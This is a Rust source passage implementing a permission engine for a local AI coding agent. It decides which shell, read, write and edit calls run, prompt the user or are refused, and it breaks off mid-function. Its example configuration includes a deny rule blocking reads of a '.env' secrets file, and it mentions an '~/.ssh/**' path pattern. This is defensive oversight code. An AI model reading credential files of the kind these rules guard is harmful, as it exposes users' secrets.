//! Which local tool calls run, which ask, and which are refused.
//!
//! Modelled on Claude Code's permission modes and rules. A [`PermissionEngine`]
//! holds a [`PermissionMode`] and two rule lists from the project's
//! `distri.toml`:
//!
//! ```toml
//! [permissions]
//! mode = "default"            # "accept-edits" | "plan" | "bypass"
//! allow = ["Bash(cargo test:*)", "Write(src/**)"]
//! deny = ["Bash(git push:*)", "Read(.env)"]
//! ```
//!
//! plus the rules the person chose "don't ask again" for, kept in
//! `~/.distri/permissions.json` per project. A call is decided in this order:
//!
//! 1. a matching **deny** rule refuses it (deny beats allow, in every mode);
//! 2. [`PermissionMode::Bypass`] runs it;
//! 3. [`PermissionMode::Plan`] refuses anything that changes something
//!    (`Bash`, `execute_command`, `Write`, `Edit`);
//! 4. a `Write`/`Edit` of a protected path (`distri.toml`, `<project>/.distri/`,
//!    `~/.distri/`) asks, whatever the allow rules say;
//! 5. a matching **allow** rule runs it;
//! 6. otherwise the mode's default: reads run; `Bash`/`execute_command` ask;
//!    `Write`/`Edit` ask, or run inside the project in
//!    [`PermissionMode::AcceptEdits`]. Other tools (script tools, which are
//!    sandboxed separately) run.
//!
//! Rules: a bare tool name (`Read`, `lookup_order`) matches every call of
//! that tool; `Bash(cargo test:*)` matches a command that starts with the
//! words `cargo test`; `Bash(git status)` matches that command exactly;
//! `Write(src/**)`, `Edit(**/*.rs)`, `Read(**)` glob the path relative to the
//! project root (`/abs/**` and `~/x/**` glob absolute and home paths). `Read`
//! path rules also cover `Glob` and `Grep`. A compound command
//! (`a && b`, `a | b`, `a; b`) is allowed by rules only when every part is,
//! and denied when any part is.

use std::collections::BTreeMap;
use std::fmt;
use std::path::{Component, Path, PathBuf};
use std::str::FromStr;
use std::sync::{Arc, Mutex, RwLock};

use anyhow::Context;
use serde::{Deserialize, Serialize};

use crate::interact::{Broker, Interaction, Reply};

/// What a refused change says in plan mode.
pub const PLAN_MODE_REASON: &str = "plan mode: no changes are made — the plan is presented instead";

/// The environment variable that overrides the configured mode.
pub const MODE_ENV: &str = "DISTRI_PERMISSION_MODE";

// ---------------------------------------------------------------------------
// Modes
// ---------------------------------------------------------------------------

/// How much runs without asking.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, Hash, Default, Serialize, Deserialize, clap::ValueEnum,
)]
#[serde(rename_all = "kebab-case")]
pub enum PermissionMode {
    /// Reads run; commands and edits ask.
    #[default]
    Default,
    /// Edits inside the project run too; commands still ask.
    #[serde(alias = "accept_edits")]
    #[value(alias = "accept_edits")]
    AcceptEdits,
    /// Nothing changes: commands and edits are refused, reads run.
    Plan,
    /// Everything runs (deny rules still apply). Only when set explicitly.
    #[serde(alias = "bypass-permissions", alias = "bypass_permissions")]
    #[value(alias = "bypass-permissions")]
    Bypass,
}

impl PermissionMode {
    /// The next mode for a "cycle mode" key: Default → AcceptEdits → Plan →
    /// Default. Bypass is never cycled into; cycling out of it goes to Default.
    pub fn next(self) -> Self {
        match self {
            PermissionMode::Default => PermissionMode::AcceptEdits,
            PermissionMode::AcceptEdits => PermissionMode::Plan,
            PermissionMode::Plan | PermissionMode::Bypass => PermissionMode::Default,
        }
    }

    /// The name in `distri.toml`, on the command line and in the environment.
    pub fn as_str(self) -> &'static str {
        match self {
            PermissionMode::Default => "default",
            PermissionMode::AcceptEdits => "accept-edits",
            PermissionMode::Plan => "plan",
            PermissionMode::Bypass => "bypass",
        }
    }

    /// The label a footer shows.
    pub fn label(self) -> &'static str {
        match self {
            PermissionMode::Default => "default",
            PermissionMode::AcceptEdits => "accept edits",
            PermissionMode::Plan => "plan mode",
            PermissionMode::Bypass => "bypass permissions",
        }
    }
}

impl fmt::Display for PermissionMode {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.label())
    }
}

impl FromStr for PermissionMode {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.trim().to_ascii_lowercase().replace('_', "-").as_str() {
            "default" => Ok(PermissionMode::Default),
            "accept-edits" | "acceptedits" => Ok(PermissionMode::AcceptEdits),
            "plan" => Ok(PermissionMode::Plan),
            "bypass" | "bypass-permissions" | "bypasspermissions" => Ok(PermissionMode::Bypass),
            other => Err(format!(
                "unknown permission mode `{other}` (expected default, accept-edits, plan or bypass)"
            )),
        }
    }
}

// ---------------------------------------------------------------------------
// Rules
// ---------------------------------------------------------------------------

/// A rule that does not parse.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[error("invalid permission rule `{rule}`: {message}")]
pub struct RuleError {
    pub rule: String,
    pub message: String,
}

/// The tools whose rules match a command.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandTool {
    Bash,
    ExecuteCommand,
}

impl CommandTool {
    fn of(tool: &str) -> Option<Self> {
        match tool {
            "Bash" => Some(CommandTool::Bash),
            "execute_command" => Some(CommandTool::ExecuteCommand),
            _ => None,
        }
    }

    pub fn name(self) -> &'static str {
        match self {
            CommandTool::Bash => "Bash",
            CommandTool::ExecuteCommand => "execute_command",
        }
    }
}

/// How a command rule matches one part of a command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CommandMatch {
    /// `Bash(cargo test:*)`: the words `cargo test`, then anything.
    Prefix(String),
    /// `Bash(git status)`: exactly this.
    Exact(String),
}

impl CommandMatch {
    fn matches(&self, part: &str) -> bool {
        match self {
            CommandMatch::Exact(e) => part == e,
            CommandMatch::Prefix(p) => {
                part == p
                    || part
                        .strip_prefix(p.as_str())
                        .is_some_and(|r| r.starts_with(' '))
            }
        }
    }
}

/// The tools whose rules match a path. `Read` rules also match `Glob` and
/// `Grep` (their `path`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PathTool {
    Read,
    Write,
    Edit,
}

impl PathTool {
    fn of(tool: &str) -> Option<Self> {
        match tool {
            "Read" | "Glob" | "Grep" => Some(PathTool::Read),
            "Write" => Some(PathTool::Write),
            "Edit" => Some(PathTool::Edit),
            _ => None,
        }
    }
}

/// What a path pattern is relative to.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PathAnchor {
    /// `src/**`: the project root. Matches only paths inside it.
    Project,
    /// `/etc/**`: the filesystem root.
    Absolute,
    /// `~/notes/**`: the home directory.
    Home,
}

/// A glob over a path, e.g. `src/**` or `~/.ssh/**`.
#[derive(Debug, Clone, PartialEq)]
pub struct PathPattern {
    anchor: PathAnchor,
    /// The glob, without the `~/` of a home pattern.
    glob: glob::Pattern,
}

const GLOB_OPTIONS: glob::MatchOptions = glob::MatchOptions {
    case_sensitive: true,
    require_literal_separator: true,
    require_literal_leading_dot: false,
};

impl PathPattern {
    fn parse(spec: &str) -> Result<Self, String> {
        let (anchor, body) = if let Some(rest) = spec.strip_prefix("~/") {
            (PathAnchor::Home, rest)
        } else if spec.starts_with('/') {
            (PathAnchor::Absolute, spec)
        } else {
            (PathAnchor::Project, spec.strip_prefix("./").unwrap_or(spec))
        };
        if body.is_empty() {
            return Err("empty path pattern".into());
        }
        if body.split('/').any(|c| c == "..") {
            return Err("`..` is not allowed in a path rule; write an absolute path".into());
        }
        let glob = glob::Pattern::new(body).map_err(|e| format!("bad glob: {e}"))?;
        Ok(Self { anchor, glob })
    }

    pub fn anchor(&self) -> PathAnchor {
        self.anchor
    }
}

/// One `allow` or `deny` entry.
#[derive(Debug, Clone, PartialEq)]
pub enum Rule {
    /// A bare tool name: every call of that tool.
    Tool(String),
    /// `Bash(…)` / `execute_command(…)`.
    Command {
        tool: CommandTool,
        matcher: CommandMatch,
    },
    /// `Read(…)` / `Write(…)` / `Edit(…)`.
    Path {
        tool: PathTool,
        pattern: PathPattern,
    },
}

impl Rule {
    pub fn parse(rule: &str) -> Result<Rule, RuleError> {
        let err = |message: String| RuleError {
            rule: rule.to_string(),
            message,
        };
        let s = rule.trim();
        if s.is_empty() {
            return Err(err("empty rule".into()));
        }
        let Some(open) = s.find('(') else {
            validate_tool_name(s).map_err(err)?;
            return Ok(Rule::Tool(s.to_string()));
        };
        let name = s[..open].trim();
        validate_tool_name(name).map_err(err)?;
        let Some(inner) = s[open + 1..].strip_suffix(')') else {
            return Err(err("missing the closing `)`".into()));
        };
        let inner = inner.trim();
        if inner.is_empty() {
            return Err(err(format!(
                "empty specifier; write `{name}` alone to match every call"
            )));
        }
        if inner == "*" {
            return Ok(Rule::Tool(name.to_string()));
        }
        if let Some(tool) = CommandTool::of(name) {
            let matcher = match inner.strip_suffix(":*") {
                Some(prefix) => {
                    let prefix = collapse_whitespace(prefix);
                    if prefix.is_empty() {
                        return Err(err("empty command prefix before `:*`".into()));
                    }
                    CommandMatch::Prefix(prefix)
                }
                None if inner.contains('*') => {
                    return Err(err(
                        "a command rule supports only a trailing `:*` wildcard, e.g. `Bash(cargo test:*)`"
                            .into(),
                    ))
                }
                None => CommandMatch::Exact(collapse_whitespace(inner)),
            };
            return Ok(Rule::Command { tool, matcher });
        }
        let tool = match name {
            "Read" => PathTool::Read,
            "Write" => PathTool::Write,
            "Edit" => PathTool::Edit,
            _ => {
                return Err(err(format!(
                    "`{name}(…)` is not supported: specifiers work for Bash, execute_command, Read, Write and Edit; write `{name}` alone to match every call"
                )))
            }
        };
        let pattern = PathPattern::parse(inner).map_err(err)?;
        Ok(Rule::Path { tool, pattern })
    }
}

impl FromStr for Rule {
    type Err = RuleError;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        Rule::parse(s)
    }
}

fn validate_tool_name(name: &str) -> Result<(), String> {
    if name.is_empty() {
        return Err("missing the tool name".into());
    }
    if let Some(c) = name
        .chars()
        .find(|c| !(c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | ':')))
    {
        return Err(format!("`{c}` cannot appear in a tool name"));
    }
    Ok(())
}

fn collapse_whitespace(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// A rule as written, with its parsed form.
#[derive(Debug, Clone)]
struct RuleEntry {
    text: String,
    rule: Rule,
}

impl RuleEntry {
    fn parse(text: &str) -> Result<Self, RuleError> {
        Ok(Self {
            text: text.trim().to_string(),
            rule: Rule::parse(text)?,
        })
    }
}

// ---------------------------------------------------------------------------
// Shell commands, split into the parts rules see
// ---------------------------------------------------------------------------

/// A command split on `;`, `&&`, `||`, `|`, `&` and newlines (outside
/// quotes), each part with its whitespace collapsed.
#[derive(Debug, Clone, PartialEq, Eq)]
struct CommandParts {
    parts: Vec<String>,
    /// `$(…)`, backticks or `<(…)`: something runs that the parts don't show,
    /// so no rule can allow it.
    hidden: bool,
}

fn split_command(command: &str) -> CommandParts {
    let chars: Vec<char> = command.chars().collect();
    let mut parts = Vec::new();
    let mut current = String::new();
    let mut hidden = false;
    let (mut single, mut double) = (false, false);
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        let next = chars.get(i + 1).copied();
        let prev = i.checked_sub(1).map(|p| chars[p]);
        if single {
            if c == '\'' {
                single = false;
            }
            current.push(c);
            i += 1;
            continue;
        }
        match c {
            '\\' => {
                current.push(c);
                if let Some(n) = next {
                    current.push(n);
                    i += 1;
                }
            }
            '\'' if !double => {
                single = true;
                current.push(c);
            }
            '"' => {
                double = !double;
                current.push(c);
            }
            '`' => {
                hidden = true;
                current.push(c);
            }
            '$' if next == Some('(') => {
                hidden = true;
                current.push(c);
            }
            '<' | '>' if next == Some('(') && !double => {
                hidden = true;
                current.push(c);
            }
            ';' | '\n' if !double => {
                parts.push(std::mem::take(&mut current));
            }
            '|' if !double => {
                parts.push(std::mem::take(&mut current));
                if next == Some('|') || next == Some('&') {
                    i += 1;
                }
            }
            // `2>&1`, `&>file`, `<&3` are redirections, not separators.
            '&' if !double && !matches!(prev, Some('>') | Some('<')) && next != Some('>') => {
                parts.push(std::mem::take(&mut current));
                if next == Some('&') {
                    i += 1;
                }
            }
            _ => current.push(c),
        }
        i += 1;
    }
    parts.push(current);
    CommandParts {
        parts: parts
            .iter()
            .map(|p| collapse_whitespace(p))
            .filter(|p| !p.is_empty())
            .collect(),
        hidden,
    }
}

/// Commands whose second word says what they do (`cargo test`, `git push`).
const SUBCOMMAND_TOOLS: &[&str] = &["git", "cargo", "npm", "pnpm", "yarn", "docker", "kubectl"];

/// Commands that run whatever follows them; "always allow" for one would
/// allow everything.
const WRAPPER_COMMANDS: &[&str] = &[
    "sudo", "bash", "sh", "zsh", "fish", "env", "xargs", "eval", "exec", "nohup", "time",
    "timeout", "nice", "command", "builtin", "source", ".",
];

/// The rule "don't ask again" adds for a command: `Bash(cargo test:*)`.
fn command_rule_hint(tool: CommandTool, command: &str) -> Option<String> {
    let parts = split_command(command);
    if parts.hidden || parts.parts.len() != 1 {
        return None;
    }
    let words: Vec<&str> = parts.parts[0].split(' ').collect();
    let first = *words.first()?;
    if first.contains(['=', '"', '\'', '(', '$', '*', '?', '['])
        || WRAPPER_COMMANDS.contains(&first)
    {
        return None;
    }
    let name = tool.name();
    if SUBCOMMAND_TOOLS.contains(&first) {
        return match words.get(1) {
            None => Some(format!("{name}({first})")),
            Some(sub) if sub.starts_with('-') || sub.contains(['"', '\'', '$', '*']) => None,
            Some(sub) => Some(format!("{name}({first} {sub}:*)")),
        };
    }
    Some(format!("{name}({first}:*)"))
}

// ---------------------------------------------------------------------------
// Paths
// ---------------------------------------------------------------------------

/// Resolve `.` and `..` without touching the filesystem.
fn normalize(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for c in path.components() {
        match c {
            Component::CurDir => {}
            Component::ParentDir => {
                if !matches!(out.components().next_back(), Some(Component::Normal(_))) {
                    if out.as_os_str().is_empty() {
                        out.push("..");
                    }
                } else {
                    out.pop();
                }
            }
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// Follow symlinks as far as the path exists: the longest existing ancestor is
/// canonicalized and the rest appended; a dangling symlink is followed to its
/// target.
fn resolve_symlinks(path: &Path) -> PathBuf {
    let mut current = normalize(path);
    for _ in 0..40 {
        let mut existing = current.clone();
        let mut rest = Vec::new();
        while existing.symlink_metadata().is_err() {
            match (existing.file_name(), existing.parent()) {
                (Some(name), Some(parent)) => {
                    rest.push(name.to_os_string());
                    existing = parent.to_path_buf();
                }
                _ => return current,
            }
        }
        let with_rest = |mut base: PathBuf| {
            for name in rest.iter().rev() {
                base.push(name);
            }
            base
        };
        match existing.canonicalize() {
            Ok(canonical) => return with_rest(canonical),
            Err(_) => match std::fs::read_link(&existing) {
                Ok(target) => {
                    let target = match existing.parent() {
                        Some(parent) if target.is_relative() => parent.join(target),
                        _ => target,
                    };
                    current = with_rest(normalize(&target));
                }
                Err(_) => return current,
            },
        }
    }
    current
}

/// `path` relative to `base`, with `/` separators; `None` outside it.
fn relative_to(path: &Path, base: &Path) -> Option<String> {
    let rel = path.strip_prefix(base).ok()?;
    Some(
        rel.components()
            .map(|c| c.as_os_str().to_string_lossy().into_owned())
            .collect::<Vec<_>>()
            .join("/"),
    )
}

fn lowercase(path: &Path) -> PathBuf {
    PathBuf::from(path.to_string_lossy().to_lowercase())
}

/// Case-insensitive: on macOS and Windows `Distri.toml` is `distri.toml`.
fn same_or_under(path: &Path, base: &Path) -> bool {
    lowercase(path).starts_with(lowercase(base))
}

fn same_path(a: &Path, b: &Path) -> bool {
    lowercase(a) == lowercase(b)
}

/// A place given to the engine, as written (made absolute) and resolved.
#[derive(Debug, Clone)]
struct Place {
    lexical: PathBuf,
    resolved: PathBuf,
}

impl Place {
    fn new(path: &Path) -> Self {
        let absolute = if path.is_absolute() {
            path.to_path_buf()
        } else {
            std::env::current_dir()
                .map(|d| d.join(path))
                .unwrap_or_else(|_| path.to_path_buf())
        };
        let lexical = normalize(&absolute);
        let resolved = resolve_symlinks(&lexical);
        Self { lexical, resolved }
    }

    fn forms(&self) -> [&Path; 2] {
        [&self.resolved, &self.lexical]
    }
}

// ---------------------------------------------------------------------------
// Config files
// ---------------------------------------------------------------------------

/// The `[permissions]` table of `distri.toml`.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PermissionsConfig {
    #[serde(default)]
    pub mode: Option<PermissionMode>,
    #[serde(default)]
    pub allow: Vec<String>,
    #[serde(default)]
    pub deny: Vec<String>,
}

/// The part of `distri.toml` the engine reads; other tables are someone else's.
#[derive(Debug, Default, Deserialize)]
struct ProjectToml {
    #[serde(default)]
    permissions: PermissionsConfig,
}

impl PermissionsConfig {
    /// `Ok(default)` when the file does not exist.
    pub fn load(path: &Path) -> anyhow::Result<Self> {
        match std::fs::read_to_string(path) {
            Ok(s) => Ok(toml::from_str::<ProjectToml>(&s)
                .with_context(|| format!("parse {}", path.display()))?
                .permissions),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Self::default()),
            Err(e) => Err(e).with_context(|| format!("read {}", path.display())),
        }
    }
}

/// `~/.distri/permissions.json`: canonical project root → remembered rules.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct RememberedFile {
    #[serde(default)]
    projects: BTreeMap<String, RememberedRules>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct RememberedRules {
    #[serde(default)]
    allow: Vec<String>,
}

impl RememberedFile {
    fn load(path: &Path) -> anyhow::Result<Self> {
        match std::fs::read_to_string(path) {
            Ok(s) => serde_json::from_str(&s).with_context(|| format!("parse {}", path.display())),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Self::default()),
            Err(e) => Err(e).with_context(|| format!("read {}", path.display())),
        }
    }
}

fn parse_rules<'a>(
    rules: impl IntoIterator<Item = &'a String>,
    source: &str,
) -> anyhow::Result<Vec<RuleEntry>> {
    rules
        .into_iter()
        .map(|r| RuleEntry::parse(r).with_context(|| source.to_string()))
        .collect()
}

// ---------------------------------------------------------------------------
// The engine
// ---------------------------------------------------------------------------

/// What [`PermissionEngine::check`] decided.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Check {
    Allow,
    Deny {
        reason: String,
    },
    Ask {
        /// What the call does, for people: the command, the path.
        summary: String,
        /// The rule "don't ask again" would add; `None` when it can't be
        /// remembered (protected paths, compound commands).
        rule_hint: Option<String>,
    },
}

/// A refused call. `message` is what the model reads as the tool result.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Denied {
    pub message: String,
}

impl fmt::Display for Denied {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.message)
    }
}

impl std::error::Error for Denied {}

/// Why a call asks, for the "nobody could be asked" message.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum AskKind {
    Command,
    Edit { inside_project: bool },
    Protected,
}

enum Decision {
    Allow,
    Deny(String),
    Ask {
        summary: String,
        rule_hint: Option<String>,
        kind: AskKind,
    },
}

/// What a call is about, as rules see it.
enum Subject {
    Command {
        tool: CommandTool,
        command: String,
        parts: CommandParts,
    },
    Path {
        tool: PathTool,
        place: Place,
        /// For an ask: "(new file, 3 lines)", "(-1 +2 lines)".
        detail: Option<String>,
    },
    Other,
}

#[derive(Deserialize)]
struct CommandInput {
    command: String,
}

#[derive(Deserialize)]
struct FileInput {
    file_path: String,
    #[serde(default)]
    content: Option<String>,
    #[serde(default)]
    old_string: Option<String>,
    #[serde(default)]
    new_string: Option<String>,
}

#[derive(Deserialize)]
struct SearchInput {
    #[serde(default)]
    path: Option<String>,
}

fn line_count(s: &str) -> usize {
    s.lines().count().max(usize::from(!s.is_empty()))
}

struct Inner {
    /// The project root, as given (absolute, normalized) and resolved.
    root: Place,
    /// The home directory (`~/` rules, `~/.distri`); `None` in tests.
    home: Option<Place>,
    /// `distri.toml` and the directories a Write/Edit always asks for.
    protected_files: Vec<Place>,
    protected_dirs: Vec<Place>,
    mode: Mutex<PermissionMode>,
    allow: RwLock<Vec<RuleEntry>>,
    deny: Vec<RuleEntry>,
    /// `~/.distri/permissions.json`; `None` keeps remembered rules in memory.
    remembered: Option<PathBuf>,
    /// Serializes read-modify-write of `remembered`.
    persist: Mutex<()>,
}

/// Decides whether a local tool call runs, asks or is refused.
#[derive(Clone)]
pub struct PermissionEngine {
    inner: Arc<Inner>,
}

impl fmt::Debug for PermissionEngine {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("PermissionEngine")
            .field("root", &self.inner.root.resolved)
            .field("mode", &self.mode())
            .finish_non_exhaustive()
    }
}

impl PermissionEngine {
    /// The engine for a project: `[permissions]` from `distri_toml` (default
    /// `<project_root>/distri.toml`), remembered rules from
    /// `~/.distri/permissions.json`. The mode is `mode_override` (the
    /// `--permission-mode` flag), else `DISTRI_PERMISSION_MODE`, else the
    /// config's, else [`PermissionMode::Default`].
    pub fn load(
        project_root: &Path,
        distri_toml: Option<&Path>,
        mode_override: Option<PermissionMode>,
    ) -> anyhow::Result<Self> {
        let home = dirs::home_dir().context("could not resolve the home directory")?;
        let env_mode = match std::env::var(MODE_ENV) {
            Ok(v) if !v.trim().is_empty() => Some(
                v.parse::<PermissionMode>()
                    .map_err(|e| anyhow::anyhow!("{MODE_ENV}: {e}"))?,
            ),
            _ => None,
        };
        Self::load_with_home(project_root, distri_toml, mode_override.or(env_mode), &home)
    }

    /// [`PermissionEngine::load`] with an explicit home directory (for
    /// `~/.distri/permissions.json`, the protected `~/.distri/` and `~/`
    /// rules) and no environment lookup.
    pub fn load_with_home(
        project_root: &Path,
        distri_toml: Option<&Path>,
        mode_override: Option<PermissionMode>,
        home: &Path,
    ) -> anyhow::Result<Self> {
        let root = Place::new(project_root);
        let toml_path = distri_toml
            .map(Path::to_path_buf)
            .unwrap_or_else(|| root.lexical.join("distri.toml"));
        let cfg = PermissionsConfig::load(&toml_path)?;
        let remembered_path = home.join(".distri").join("permissions.json");
        let remembered = RememberedFile::load(&remembered_path)?;

        let toml_label = toml_path.display().to_string();
        let mut allow = parse_rules(&cfg.allow, &format!("{toml_label} [permissions] allow"))?;
        if let Some(rules) = remembered.projects.get(&project_key(&root)) {
            allow.extend(parse_rules(
                &rules.allow,
                &format!("{} (remembered rules)", remembered_path.display()),
            )?);
        }
        let deny = parse_rules(&cfg.deny, &format!("{toml_label} [permissions] deny"))?;
        let mode = mode_override.or(cfg.mode).unwrap_or_default();

        Ok(Self::build(
            root,
            Some(Place::new(home)),
            Some(toml_path),
            mode,
            allow,
            deny,
            Some(remembered_path),
        ))
    }

    /// An engine with the given rules and no file IO: no home directory and
    /// remembered rules stay in memory. Panics on a malformed rule.
    pub fn new_for_test(
        project_root: &Path,
        mode: PermissionMode,
        allow: &[&str],
        deny: &[&str],
    ) -> Self {
        let parse = |rules: &[&str]| -> Vec<RuleEntry> {
            rules
                .iter()
                .map(|r| RuleEntry::parse(r).unwrap_or_else(|e| panic!("{e}")))
                .collect()
        };
        Self::build(
            Place::new(project_root),
            None,
            None,
            mode,
            parse(allow),
            parse(deny),
            None,
        )
    }

    fn build(
        root: Place,
        home: Option<Place>,
        distri_toml: Option<PathBuf>,
        mode: PermissionMode,
        allow: Vec<RuleEntry>,
        deny: Vec<RuleEntry>,
        remembered: Option<PathBuf>,
    ) -> Self {
        let mut protected_files = vec![Place::new(&root.lexical.join("distri.toml"))];
        if let Some(path) = distri_toml {
            protected_files.push(Place::new(&path));
        }
        let mut protected_dirs = vec![Place::new(&root.lexical.join(".distri"))];
        if let Some(home) = &home {
            protected_dirs.push(Place::new(&home.lexical.join(".distri")));
        }
        Self {
            inner: Arc::new(Inner {
                root,
                home,
                protected_files,
                protected_dirs,
                mode: Mutex::new(mode),
                allow: RwLock::new(allow),
                deny,
                remembered,
                persist: Mutex::new(()),
            }),
        }
    }

    pub fn mode(&self) -> PermissionMode {
        *self.inner.mode.lock().unwrap_or_else(|e| e.into_inner())
    }

    pub fn set_mode(&self, mode: PermissionMode) {
        *self.inner.mode.lock().unwrap_or_else(|e| e.into_inner()) = mode;
    }

    /// Move to [`PermissionMode::next`] and return it.
    pub fn cycle_mode(&self) -> PermissionMode {
        let mut mode = self.inner.mode.lock().unwrap_or_else(|e| e.into_inner());
        *mode = mode.next();
        *mode
    }

    /// Decide a call without asking anyone.
    pub fn check(&self, tool: &str, input: &serde_json::Value) -> Check {
        match self.decide(tool, input) {
            Decision::Allow => Check::Allow,
            Decision::Deny(reason) => Check::Deny { reason },
            Decision::Ask {
                summary, rule_hint, ..
            } => Check::Ask { summary, rule_hint },
        }
    }

    /// Decide a call, asking `broker` when the decision is to ask. On
    /// "don't ask again" the rule hint becomes an allow rule, remembered for
    /// this project.
    pub async fn authorize(
        &self,
        broker: &dyn Broker,
        tool: &str,
        input: &serde_json::Value,
    ) -> Result<(), Denied> {
        let (summary, rule_hint, kind) = match self.decide(tool, input) {
            Decision::Allow => return Ok(()),
            Decision::Deny(message) => return Err(Denied { message }),
            Decision::Ask {
                summary,
                rule_hint,
                kind,
            } => (summary, rule_hint, kind),
        };
        let reply = broker
            .ask(Interaction::Permit {
                tool: tool.to_string(),
                summary: summary.clone(),
                rule_hint: rule_hint.clone(),
            })
            .await;
        match reply {
            Reply::Allow { remember } => {
                if remember {
                    if let Some(rule) = &rule_hint {
                        if let Err(e) = self.remember(rule) {
                            tracing::warn!("could not remember permission rule `{rule}`: {e:#}");
                        }
                    }
                }
                Ok(())
            }
            Reply::Deny { reason } => Err(user_denied(tool, reason)),
            Reply::Text(text) => Err(user_denied(tool, Some(text))),
            Reply::Unavailable => Err(Denied {
                message: unavailable_message(tool, &summary, rule_hint.as_deref(), kind),
            }),
        }
    }

    /// Add an allow rule and persist it for this project.
    fn remember(&self, rule: &str) -> anyhow::Result<()> {
        let entry = RuleEntry::parse(rule)?;
        {
            let mut allow = self.inner.allow.write().unwrap_or_else(|e| e.into_inner());
            if !allow.iter().any(|r| r.text == entry.text) {
                allow.push(entry.clone());
            }
        }
        let Some(path) = &self.inner.remembered else {
            return Ok(());
        };
        let _guard = self.inner.persist.lock().unwrap_or_else(|e| e.into_inner());
        let mut file = RememberedFile::load(path)?;
        let rules = file
            .projects
            .entry(project_key(&self.inner.root))
            .or_default();
        if !rules.allow.contains(&entry.text) {
            rules.allow.push(entry.text);
        }
        crate::script_tools::write_atomic(path, serde_json::to_string_pretty(&file)?.as_bytes())
    }

    fn decide(&self, tool: &str, input: &serde_json::Value) -> Decision {
        let subject = match self.subject(tool, input) {
            Ok(s) => s,
            Err(e) => return Decision::Deny(format!("invalid {tool} parameters: {e}")),
        };
        if let Some(rule) = self.denied_by(tool, &subject) {
            return Decision::Deny(format!("{tool} is denied by the permission rule `{rule}`."));
        }
        let mode = self.mode();
        if mode == PermissionMode::Bypass {
            return Decision::Allow;
        }
        let changes = match &subject {
            Subject::Command { .. } => true,
            Subject::Path { tool, .. } => *tool != PathTool::Read,
            Subject::Other => false,
        };
        if changes && mode == PermissionMode::Plan {
            return Decision::Deny(PLAN_MODE_REASON.to_string());
        }
        if let Subject::Path {
            tool: PathTool::Write | PathTool::Edit,
            place,
            detail,
        } = &subject
        {
            if let Some(why) = self.protected(place) {
                return Decision::Ask {
                    summary: format!(
                        "{}{} — {why}",
                        self.display_path(place),
                        detail
                            .as_deref()
                            .map(|d| format!(" {d}"))
                            .unwrap_or_default()
                    ),
                    rule_hint: None,
                    kind: AskKind::Protected,
                };
            }
        }
        if self.allowed(tool, &subject) {
            return Decision::Allow;
        }
        match subject {
            Subject::Other => Decision::Allow,
            Subject::Path {
                tool: PathTool::Read,
                ..
            } => Decision::Allow,
            Subject::Path {
                tool: path_tool,
                place,
                detail,
            } => {
                let inside_project = place.resolved.starts_with(&self.inner.root.resolved);
                if inside_project && mode == PermissionMode::AcceptEdits {
                    return Decision::Allow;
                }
                let shown = self.display_path(&place);
                let name = if path_tool == PathTool::Write {
                    "Write"
                } else {
                    "Edit"
                };
                Decision::Ask {
                    summary: match detail {
                        Some(d) => format!("{shown} {d}"),
                        None => shown.clone(),
                    },
                    rule_hint: Some(format!("{name}({})", glob::Pattern::escape(&shown))),
                    kind: AskKind::Edit { inside_project },
                }
            }
            Subject::Command { tool, command, .. } => Decision::Ask {
                rule_hint: command_rule_hint(tool, &command),
                summary: command,
                kind: AskKind::Command,
            },
        }
    }

    fn subject(&self, tool: &str, input: &serde_json::Value) -> Result<Subject, String> {
        let parse_err = |e: serde_json::Error| e.to_string();
        if let Some(command_tool) = CommandTool::of(tool) {
            let input = CommandInput::deserialize(input).map_err(parse_err)?;
            return Ok(Subject::Command {
                tool: command_tool,
                parts: split_command(&input.command),
                command: input.command,
            });
        }
        let Some(path_tool) = PathTool::of(tool) else {
            return Ok(Subject::Other);
        };
        if tool == "Glob" || tool == "Grep" {
            let input = SearchInput::deserialize(input).map_err(parse_err)?;
            let place = match input.path.as_deref().filter(|p| !p.is_empty()) {
                Some(p) => self.place_of(p),
                None => self.inner.root.clone(),
            };
            return Ok(Subject::Path {
                tool: path_tool,
                place,
                detail: None,
            });
        }
        let input = FileInput::deserialize(input).map_err(parse_err)?;
        let place = self.place_of(&input.file_path);
        let detail = match path_tool {
            PathTool::Read => None,
            PathTool::Write => input.content.as_deref().map(|c| {
                let state = if place.resolved.exists() {
                    "overwrite"
                } else {
                    "new file"
                };
                format!("({state}, {} lines)", line_count(c))
            }),
            PathTool::Edit => match (&input.old_string, &input.new_string) {
                (Some(old), Some(new)) => {
                    Some(format!("(-{} +{} lines)", line_count(old), line_count(new)))
                }
                _ => None,
            },
        };
        Ok(Subject::Path {
            tool: path_tool,
            place,
            detail,
        })
    }

    /// A path from a tool call: relative to the project root, as the handlers
    /// resolve it.
    fn place_of(&self, path: &str) -> Place {
        let p = Path::new(path);
        if p.is_absolute() {
            Place::new(p)
        } else {
            Place::new(&self.inner.root.lexical.join(p))
        }
    }

    /// Inside the project: relative; outside: absolute.
    fn display_path(&self, place: &Place) -> String {
        let root = &self.inner.root;
        relative_to(&place.resolved, &root.resolved)
